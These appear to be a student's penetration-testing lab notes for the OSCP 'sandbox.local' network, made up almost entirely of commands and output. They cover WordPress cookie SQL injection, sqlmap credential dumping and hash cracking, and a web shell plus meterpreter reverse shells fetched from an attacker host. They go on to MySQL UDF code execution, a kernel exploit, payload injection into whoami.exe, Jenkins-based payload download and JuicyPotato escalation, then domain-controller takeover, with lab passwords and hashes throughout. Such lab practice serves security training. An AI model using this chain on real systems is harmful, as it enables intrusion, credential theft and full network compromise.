#### Breakdown

```
sudo bash -c " echo ‘10.11.1.250 sandbox.local’ >> /etc/hosts"

```

```
sudo nmap -sC -sS -p0-65535 sandbox.local

dirb http://sandbox.local -o dirb.out

wpscan --url sandbox.local --enumerate ap,at,cb,dbe -o wp-out.txt

wp_sap cookie value

["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]

 ["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"]

 ["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns WHERE table_name='wp_users'#"]

["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#"]

["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"]

```

Using sqlmap

```

sqlmap --url='http://sandbox.local/' --cookie="wp_sap=[\"1650149780')) OR 1=2 *#\"]" --dbms=mysql --union-cols=10-11 --technique U 

sqlmap -r req.txt  --dbms=mysql --union-cols=10-11 --technique U   --level=3 --current-db --tables 

sqlmap -r req.txt  --dbms=mysql --union-cols=10-11 --technique U   --level=3 -D wordpress -T wp_users --dump


sqlmap -r sandbox.local_sqlmap_request.txt -p 'wp_sap' --level=5 --dbms=mysql --sql-query="SELECT user_login FROM wp_users"

sqlmap -r sandbox.local_sqlmap_request.txt -p 'wp_sap' --level=5 --dbms=mysql --sql-query="SELECT user_pass, user_login FROM wp_users"

```

content of req.txt

```
┌──(kali㉿kali)-[~/oscp/machines/sandbox]
└─$ cat req.txt 
GET / HTTP/1.1
Host: sandbox.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://sandbox.local/
DNT: 1
Connection: close
Cookie: wp_sap=["1650149780')) OR 1=2 *#"];
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

hash from sqlmap: $P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i\\\\\\/

6 \ is for one /.
Real hash: $P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i/

on web ui there were three \ in the hash.

user: wp_ajla_admin
 
cracking password:

john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt

```
┌──(kali㉿kali)-[~/…/share/sqlmap/output/sandbox.local]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.txt        
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!love29jan2006!  (?)     
1g 0:00:04:45 DONE (2022-06-22 21:18) 0.003497g/s 50146p/s 50146c/s 50146C/s !luv2:P..!kasumi12
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed. 

```
##### Obtaining a shell

cp /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php .

zip plugin-shell.zip plugin-shell.php

http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.119.175 LPORT=443 -f elf > shell.elf

python -m http.server 80

http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=wget%20http://192.168.119.175/shell.elf

http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=chmod%20%2bx%20shell.elf

sudo msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD linux/x86/meterpreter/reverse_tcp;\
set LHOST 192.168.119.175;\
set LPORT 443;\
run"


sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=./shell.elf

##### Post exploitation enum

shell

wheoami

ifconfig

hostname

cat /etc/issue

cat /proc/version

pwd

cd /var/www/html/

la -alh

cat wp-config.php

...
// ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );
/** MySQL database username */ define( 'DB_USER', 'wp' );
/** MySQL database password */
define( 'DB_PASSWORD', 'Lv9EVQq86cfi8ioWsqFUQyU' );
/** MySQL hostname */
define( 'DB_HOST', '10.5.5.11' ); 
...

##### Creating pivot

#!/bin/bash 
host=10.5.5.11
for port in {1..65535}; do
    timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
        echo "port $port is open" 
done
echo "Done"




meterpreter > upload /home/kali/oscp/machines/sandbox/portscan.sh /tmp/portscan.sh

shell

cd /tmp

chmpd +x portscan.sh

./portscan.sh


 ssh -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@192.168.119.175

ssh-keygen -t rsa -N ‘’ -f ~/.ssh/key
ssh -f -N -R 1080 -o “UserKnownHostsFile=/dev/null” -o “StrictHostKeyChecking=no” -I key kali@192.168.119.164


mkdir keys

cd keys

ssh-keygen -> /tmp/keys/id_rsa

cat id_rsa.pub

~/.ssh/authorized_keys file on kali:

from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDzh/B5vgOqt5h9Bp9eXdaIbu+ySMpOGElJp2GascgZ0slhHvzAfsOKkCNLebgWZXbsze2oPvXe0huFJx0AybBOYBaMLeRWbPbL3EihFTMLCGOBJ4hVtTqzf+F8KQweEzpYq/7c1+l5d2Ljui8li+5PZQE0s7U8eBxpxTo2shnVr9k7vmsqIOu5yFO9kgI9XJ1xqh/VogQE9Sf3d9rvm0CKOuPycbI8NiChD3eU8CG3XkurqiTPzklnC11Gt7CSKJ6vzOLH+bMY5Ujf1WE7DVRxHqdIYhPNLqntkRXr2oGPZrMWhg9ykvbN0T7n+DIT74EiA4nkTuXAY2QrTZysWucl www-data@ajla

 ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.119.175

checking ports on kali:
sudo netstat -tulpn

##### Targeting Database

mysql --host=127.0.0.1 --port=13306 --user=wp -pLv9EVQq86cfi8ioWsqFUQyU

SHOW Grants;
select @@hostname, @@tmpdir, @@version, @@version_compile_machine, @@plugin_dir;

show variables like 'hostname';
show variables like 'plugin_dir';
show variables like 'tmpdir';
show variables like 'version';
show variables like 'version_compile_machine';


/usr/share/exploitdb/exploits/linux/local/46249.py

https://www.exploit-db.com/papers/44139/ 

MySQL UDF Exploitation

Main sql queries:

select @@plugin_dir
select binary 0xshellcode into dumpfile @@plugin_dir;
create function sys_exec returns int soname udf_filename;
select * from mysql.func where name='sys_exec' \G
select sys_exec('cp /bin/sh /tmp/; chown root:root /tmp/sh; chmod +s /tmp/sh')

git clone https://github.com/mysqludf/lib_mysqludf_sys.git

cd lib_mysqludf_sys

sudo apt update && sudo apt install default-libmysqlclient-dev
sudo apt install default-libmysqld-dev
sudo apt install libmariadbd-dev

rm lib_mysqludf_sys.so

Adjusting makefile based on MariaDB install
cat makefile
---
LIBDIR=/usr/lib
install:
gcc -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ - I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so

---

This worked:
=====
git clone https://github.com/mysqludf/lib_mysqludf_sys.git
cd lib_mysqludf_sys
rm lib_mysqludf_sys.so
sed -i 's|$(LIBDIR)|.|g' Makefile
sed -i 's|-Wall -I/usr/include/mysql|-Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private|g' Makefile
ex lib_mysqludf_sys.c <<<"57,62m27|wq"
sudo apt install libmariadbd-dev
make
=====

make

Creating hexdump of library:
xxd -p lib_mysqludf_sys.so | tr -d '\n' > lib_mysqludf_sys.so.hex

Creating 64bit shellcode variable:

MariaDB [(none)]> set @shell = 0x7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000e03b 0000000000000000000040003800090040001c001b000100000004000000000000...00000000000000000 000;

Remember to add '0x' at the beginning.

MariaDB [(none)]> select @@plugin_dir;

Dumping shell to a file:
MariaDB [(none)]> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';

Got access denied.

##### Deeper enumeration f the Web application server

shell

netstat -tulpn

uname -a

searchsploit ubuntu 16.04

cp /usr/share/exploitdb/exploits/linux/local/45010.c ./

find / -name gcc -type f 2>/dev/null

gcc 45010.c -o 45010

meterpreter > upload /home/kali/45010 /tmp/

shell
cd /tmp
chmod +x 45010
./45010

whoami


on kali generate ssh keys using ssh-keygen command

mkdir /root/.ssh

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" > /root/.ssh/authorized_keys

ssh root@sandbox.local

cd /home/ajla

la -lah
cat ./.bash_history

no info - account not used much

cat ~/.bash_history

in the file: mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb -h 10.5.5.11 -e 'DROP DATABASE wordpress;'

##### Targeting database

mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb --host=127.0.0.1 --port=13306



MariaDB [(none)]> set @shell = 0x7f454c4602010100000000000000000003003e000100000000110000000000004000000000000000e03b 0000000000000000000040003800090040001c001b000100000004000000000000...00000000000000000 000;

Remember to add '0x' at the beginning.

MariaDB [(none)]> select @@plugin_dir;

Dumping shell to a file:
MariaDB [(none)]> select binary @shell into dumpfile '/home/dev/plugin/udf_sys_exec.so';

create function sys_exec returns int soname 'udf_sys_exec.so';

select * from mysql.func where name='sys_exec';

select sys_exec('wget http://192.168.119.175');

select sys_exec('wget http://192.168.119.175/shell.elf');

select sys_exec('chmod +x ./shell.elf');

msf5 exploit(multi/handler) > exit
kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD linux/x86/meterpreter/reverse_tcp;\ set LHOST 10.11.0.4;\
set LPORT 443;\
run"


MariaDB [(none)]> select sys_exec('./shell.elf');


##### Post exploitation of zora

cat /etc/issue

cat /proc/version

env

netstat -tulpn

cat /etc/fstab

cd /mnt/scripts
ls
cat system_report.ps1

---
# find a better way to automate this
$username = "sandbox\alex"
$pwdTxt = "Ndawc*nRoqkC+haZ"
$securePwd = $pwdTxt | ConvertTo-SecureString
$credObject = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePwd
# Enable remote management on Poultry $remoteKeyParams = @{
ComputerName = "POULTRY"
Path = 'HKLM:\SOFTWARE\Microsoft\WebManagement\Server' Name = 'EnableRemoteManagement'
Value = '1'
}
Set-RemoteRegistryValue @remoteKeyParams -Credential $credObject
# Strange calc processes running lately
---

###### creating stable reverse tunnel

ssh -V
ssh-keygen
cat /var/lib/mysql/.ssh/id_rsa.pub

---
from="10.11.1.250",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDjXfzRNbOMNKiZIYvsxCeHV7vA+pnbzKHMMWxYLTR+xPEycHlWpDB2ktM5cgEp13ei6Krssa8cs0PwBWhQVJiyTLsF/a/VwUE11YKPnt/khZh/TdeFCzU6onZUEiB0RDdyIY88VliHBY5Lsg1Vb8onm6YglxuHupjAXJm9BB74chIAqxh/Og7MuK5p6b6HykjGOLXzy0HgNdowXQrwB5z8u7o0oqf2hnPug+VKo9V294TAdiNtr/Lz3HGX89MJH8V3Y7261Il4gwIah85BwlkxkfeSZadZvC9TOAtM4jH4WF3k5izBLM0asLvfgZeSe/eDw8P0sGXw/0jcw1xDZLPkxP5oIy/iFdjCEHeBm8c/oq2z2OU5V0HFKs3Ig7ui3ecdoYgVRnDeH7iXQUaYkU2eKCjX9ykzEv4fxU44+WHDUCxRKclCmQvBeokbceYE4hJpJ8QpnZfQf/BXlyPWfO+2sl0h7Gi+gdv6YEGz+T/ZQTrMD+e+ssdYjMkXn0kiM0= mysql@zora
---

 ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /var/lib/mysql/.ssh/id_rsa kali@192.168.119.175

just -R 1080 in abobe ssh command created a socks proxy on kali

sudo netstat -tulpn

update proxychains4.conf -> socks4 127.0.0.1 1080 --- on kali

proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20 --- on kali


proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard

systeminfo
netstat -ano
net user /domain alex
wmic service get name,displayname,pathname,startmode

wmic service get name,displayname,pathname,startmode | findstr /i "auto"

wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"

icacls "C:\Puppet"

kali@kali:~$ mkdir poultry
kali@kali:~$ cp /usr/share/windows-resources/binaries/whoami.exe ./poultry/ kali@kali:~$ cd poultry/
kali@kali:~/poultry$
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.175 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin

Inject payload in whoami.exe

shellter

---
Choose Operation Mode - Auto/Manual (A/M/H): A
PE Target: /home/kali/poultry/whoami.exe

Enable Stealth Mode? (Y/N/H): N

Use a listed payload or custom? (L/C/H): C

Select Payload: /home/kali/poultry/met.bin
Is this payload a reflective DLL loader? (Y/N/H): N

---

start webserver on kali

sudo python3 -m http.server 80

download whomai.exe using ie

rename it to current.exe and place in c:\puppet folder

kali@kali:~$ sudo msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD windows/meterpreter/reverse_tcp;\
set AutoRunScript post/windows/manage/migrate;\
set LHOST 192.168.119.175;\
set LPORT 80;\
run"

restart poultry using command: shutdown -r

after getting meterpreter shell:
shell

whoami

ipconfig

net user poultryadmin OffSecHax1!

meterpreter > use incognito
meterpreter > list_tokens -u

check other boxes in network

for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && echo 10.5.5.%i is up.

kali@kali:~$ proxychains nmap --top-ports=1000 -sT -Pn 10.5.5.25,30 --open

proxychains nmap - p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sC -sT -Pn 10.5.5.30

proxychains nmap -p135,139,445,8080 -sC -sT -Pn 10.5.5.25

On kali firefox, setup socks4 proxy 127.0.0.1 1080 port

now access 10.5.5.25:8080 from firefox on kali.

login admin:admin

add a new freestyle jenkins job. add build step. windows batch command.

whoami

build now -> check console output



kali@kali:~$ cd ~
kali@kali:~$ mkdir cevapi
kali@kali:~$ cd cevapi/
kali@kali:~/cevapi$ cp ../poultry/whoami.exe ./

sudo python3 -m http.server 80

Update jenkins job:
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.175/whoami.exe', 'c:\Users\Public\whoami.exe')



sudo msfconsole -q -x "use exploit/multi/handler;\
set PAYLOAD windows/meterpreter/reverse_tcp;\
set LHOST 192.168.119.175;\
set LPORT 80;\
run"

meterpreter> shell

whoami

net user jenkinsuser

whomai /priv

systeminfo

Windows 10 pro build 15063

juicy potato

https://github.com/ohpe/juicy- potato

https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

upload /home/kali/oscp/machines/cevapi/JuicyPotato.exe c:/Users/Public/JuicyPotato.exe

update jenkins job:
C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\whoami.exe -l 5837

We also must check the Execute concurrent builds if necessary checkbox to allow us to run both the old build and the new build at once


shell

whoami

C:\Windows\system32>type c:\users\cevapiadmin\desktop\proof.txt
type c:\users\cevapiadmin\desktop\proof.txt
3f169d7cf4ad852b81c1c7ca9e508166

exit

meterpreter > use incognito
meterpreter > list_tokens -u

meterpreter > impersonate_token sandbox\\Administrator

meterpreter > getuid

meterpreter > shell

whoami

net user /domain administrator

nslookup

> set type=all

> _ldap._tcp.dc._msdcs.sandbox.local

> exit

meterpreter> shell

powershell

PS C:\Windows\system32> $dcsesh = New-PSSession -Computer SANDBOXDC 
$dcsesh = New-PSSession -Computer SANDBOXDC
PS C:\Windows\system32>

PS C:\Windows\system32> Invoke-Command -Session $dcsesh -ScriptBlock {ipconfig}

PS C:\Windows\system32> Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh

meterpreter > background

run -j

sessions -l
 sessions -i 2

shell
powershell

$dcsesh = New-PSSession -Computer SANDBOXDC

Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\whoami.exe}

background
sessions -l
sessions -i 3

shell

whoami

sessions -k 1 -  kill a session


proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py admin:UWyBGeTp3Bhw7f@10.5.5.30


